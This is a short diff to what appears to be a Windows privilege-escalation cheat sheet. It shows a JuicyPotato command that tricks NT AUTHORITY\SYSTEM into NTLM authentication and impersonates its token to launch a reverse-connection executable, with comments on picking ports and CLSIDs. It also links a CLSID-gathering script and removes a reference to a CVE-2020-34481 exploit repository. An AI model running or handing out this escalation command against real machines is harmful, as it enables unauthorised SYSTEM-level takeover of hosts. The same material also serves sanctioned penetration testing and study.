@@ -16,12 +16,12 @@ whoami /priv
 
 # trick NT AUTHORITY\SYSTEM into authenticating via NTLM to a TCP endpoint under control, MitM this authentication and impersonate the token
 # -l can by any local port on target system, reverseConnection can be exe, bat or similar
-# -c CLSID can alternatively be picked from here: https://ohpe.it/juicy-potato/CLSID
 .\JuicyPotato.exe -l <port> -p <reverseConnection>.exe -c {4991d34b-80a1-4291-83b6-3328366b9097} -t *
 
+# get CLSID
+# https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1
+# alternatively https://ohpe.it/juicy-potato/CLSID
 
-### CVE-2020-34481
-https://github.com/jacob-baines/concealed_position 
 
 
 ### Scheduled Tasks
